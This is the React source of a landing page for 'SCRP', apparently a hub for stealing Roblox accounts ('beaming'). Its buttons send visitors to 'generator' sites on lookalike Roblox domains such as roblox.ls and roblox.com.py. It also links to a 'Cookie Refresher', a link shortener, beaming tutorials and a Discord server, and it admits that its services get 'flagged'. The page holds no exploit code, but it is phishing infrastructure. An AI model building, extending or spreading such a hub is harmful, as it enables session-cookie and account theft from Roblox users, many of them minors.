"use client"

import { useState } from "react"
import { Button } from "@/components/ui/button"
import { Card, CardContent } from "@/components/ui/card"
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogTrigger } from "@/components/ui/dialog"
import { Zap, Code, Shield, Cpu, ExternalLink, BookOpen, Settings } from "lucide-react"

export default function HomePage() {
  const [isGeneratorOpen, setIsGeneratorOpen] = useState(false)

  const generatorOptions = [
    {
      name: "Main site",
      icon: Zap,
      description: "Primary generation platform",
      url: "https://app.genn.lu/auth/scrpsites",
    },
    {
      name: "Back up site",
      icon: Code,
      description: "Alternative generation platform",
      url: "https://app.beaming.pro/u/site",
    },
    {
      name: "Immortal site",
      icon: Shield,
      description: "Advanced generation tools",
      url: "https://roblox.ls/dashboard/?code=MzA4MzM0MjE1OTg2NjI2OTI4NF8wMjAyMzY5ODk3NjA5MDI0MjE=",
    },
    {
      name: "Shockify",
      icon: Cpu,
      description: "High-performance tools",
      url: "https://roblox.com.py/dashboard/?code=MDIwMjM2OTg5NzYwOTAyNDIx",
    },
  ]

  return (
    <div className="min-h-screen bg-gradient-to-br from-black via-purple-950 to-black relative overflow-hidden">
      {/* Animated background elements */}
      <div className="absolute inset-0 overflow-hidden">
        <div className="absolute -top-40 -right-40 w-80 h-80 bg-purple-500/20 rounded-full blur-3xl animate-pulse"></div>
        <div className="absolute -bottom-40 -left-40 w-80 h-80 bg-purple-600/20 rounded-full blur-3xl animate-pulse delay-1000"></div>
        <div className="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 w-96 h-96 bg-purple-400/10 rounded-full blur-3xl animate-pulse delay-500"></div>
      </div>

      {/* Grid pattern overlay */}
      <div className="absolute inset-0 bg-[linear-gradient(rgba(147,51,234,0.1)_1px,transparent_1px),linear-gradient(90deg,rgba(147,51,234,0.1)_1px,transparent_1px)] bg-[size:50px_50px]"></div>

      <div className="relative z-10 container mx-auto px-4 py-8">
        {/* Header */}
        <header className="text-center mb-16">
          <div className="inline-flex items-center gap-3 mb-6">
            <div className="w-12 h-12 bg-gradient-to-r from-purple-500 to-purple-700 rounded-lg flex items-center justify-center">
              <Code className="w-6 h-6 text-white" />
            </div>
            <h1 className="text-6xl font-bold bg-gradient-to-r from-purple-400 via-purple-300 to-white bg-clip-text text-transparent">
              SCRP
            </h1>
          </div>
          <p className="text-purple-200 text-lg mb-8 max-w-2xl mx-auto">
            Advanced automation and generation tools for the modern digital world
          </p>
          <Button
            className="bg-gradient-to-r from-purple-600 to-purple-700 hover:from-purple-700 hover:to-purple-800 text-white px-8 py-3 rounded-full text-lg font-semibold shadow-lg hover:shadow-purple-500/25 transition-all duration-300"
            onClick={() => window.open("https://discord.gg/TS57tJqDgp", "_blank")}
          >
            <ExternalLink className="w-5 h-5 mr-2" />
            Join Our Discord
          </Button>
        </header>

        {/* Main Content */}
        <div className="max-w-4xl mx-auto space-y-8">
          {/* Main Generator Section */}
          <Card className="bg-black/40 border-purple-500/30 backdrop-blur-sm">
            <CardContent className="p-8">
              <div className="text-center mb-6">
                <h2 className="text-2xl font-bold text-white mb-2 flex items-center justify-center gap-2">
                  <Zap className="w-6 h-6 text-purple-400" />
                  Main Generator Hub
                </h2>
                <p className="text-purple-200">Select your platform and unleash the power</p>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-6">
                <Button
                  variant="outline"
                  className="bg-purple-900/50 border-purple-500/50 text-purple-100 hover:bg-purple-800/50 hover:border-purple-400 h-14 text-lg font-semibold"
                >
                  TikTok-Supported
                </Button>
                <Button
                  variant="outline"
                  className="bg-purple-900/50 border-purple-500/50 text-purple-100 hover:bg-purple-800/50 hover:border-purple-400 h-14 text-lg font-semibold"
                >
                  Chrome-Supported
                </Button>
              </div>

              <Dialog open={isGeneratorOpen} onOpenChange={setIsGeneratorOpen}>
                <DialogTrigger asChild>
                  <Button className="w-full bg-gradient-to-r from-purple-600 to-purple-700 hover:from-purple-700 hover:to-purple-800 text-white h-16 text-xl font-bold rounded-lg shadow-lg hover:shadow-purple-500/25 transition-all duration-300">
                    <Zap className="w-6 h-6 mr-2" />
                    Generator
                  </Button>
                </DialogTrigger>
                <DialogContent className="bg-black/90 border-purple-500/30 backdrop-blur-sm max-w-2xl">
                  <DialogHeader>
                    <DialogTitle className="text-2xl font-bold text-white text-center mb-4">
                      Choose Generator Type
                    </DialogTitle>
                  </DialogHeader>
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    {generatorOptions.map((option, index) => (
                      <Button
                        key={index}
                        variant="outline"
                        className="bg-purple-900/30 border-purple-500/50 text-purple-100 hover:bg-purple-800/50 hover:border-purple-400 h-24 flex-col gap-2 transition-all duration-300"
                        onClick={() => {
                          window.open(option.url, "_blank")
                          setIsGeneratorOpen(false)
                        }}
                      >
                        <option.icon className="w-8 h-8 text-purple-400" />
                        <div className="text-center">
                          <div className="font-semibold">{option.name}</div>
                          <div className="text-xs text-purple-300">{option.description}</div>
                        </div>
                      </Button>
                    ))}
                  </div>
                </DialogContent>
              </Dialog>

              <div className="mt-6 space-y-3">
                <Button
                  variant="outline"
                  className="w-full bg-blue-900/30 border-blue-500/50 text-blue-100 hover:bg-blue-800/50 hover:border-blue-400 h-12"
                  onClick={() => window.open("https://app.genn.lu/tools/refresher", "_blank")}
                >
                  <Settings className="w-5 h-5 mr-2" />
                  Cookie Refresher
                </Button>
                <Button
                  variant="outline"
                  className="w-full bg-green-900/30 border-green-500/50 text-green-100 hover:bg-green-800/50 hover:border-green-400 h-12"
                  onClick={() => window.open("https://variares-hyperlink-9jmo2y.vercel.app/", "_blank")}
                >
                  <ExternalLink className="w-5 h-5 mr-2" />
                  Link Shortener
                </Button>
              </div>

              <div className="mt-6 text-center">
                <p className="text-purple-300 text-sm">
                  If any services are down or flagged, we're aware and working on fixes ASAP
                </p>
              </div>
            </CardContent>
          </Card>

          {/* Tutorial Section */}
          <Card className="bg-black/40 border-purple-500/30 backdrop-blur-sm">
            <CardContent className="p-8">
              <div className="text-center mb-6">
                <h2 className="text-2xl font-bold text-white mb-2 flex items-center justify-center gap-2">
                  <BookOpen className="w-6 h-6 text-purple-400" />
                  Beaming Tutorials
                </h2>
                <p className="text-purple-200">Master the tools with our comprehensive guides</p>
              </div>

              <div className="space-y-4">
                <Button
                  className="w-full bg-gradient-to-r from-purple-600/80 to-purple-700/80 hover:from-purple-700/80 hover:to-purple-800/80 text-white h-14 text-lg font-semibold"
                  onClick={() => window.open("https://youtube.com/shorts/DMVnz_MwfDQ?si=udeV1R2XbFIfGY9q", "_blank")}
                >
                  <BookOpen className="w-5 h-5 mr-2" />
                  Main Site Tutorial
                </Button>
                <Button
                  variant="outline"
                  className="w-full bg-purple-900/30 border-purple-500/50 text-purple-100 hover:bg-purple-800/50 hover:border-purple-400 h-14 text-lg font-semibold"
                  onClick={() => window.open("https://youtube.com/shorts/S8nOAocX4F8?si=6Y1BXY885qZf-ip9", "_blank")}
                >
                  <Shield className="w-5 h-5 mr-2" />
                  Backup Site Tutorial
                </Button>
                <Button
                  variant="outline"
                  className="w-full bg-red-900/30 border-red-500/50 text-red-100 hover:bg-red-800/50 hover:border-red-400 h-14 text-lg font-semibold"
                  onClick={() => window.open("https://youtube.com/shorts/26maE7tiDBk?si=wCBR24PqsrJbjO-Y", "_blank")}
                >
                  <Cpu className="w-5 h-5 mr-2" />
                  Immortal Site Tutorial
                </Button>
              </div>
            </CardContent>
          </Card>
        </div>

        {/* Footer */}
        <footer className="text-center mt-16 text-purple-300">
          <p>&copy; 2024 SCRP. Advanced automation tools for the digital age.</p>
        </footer>
      </div>
    </div>
  )
}
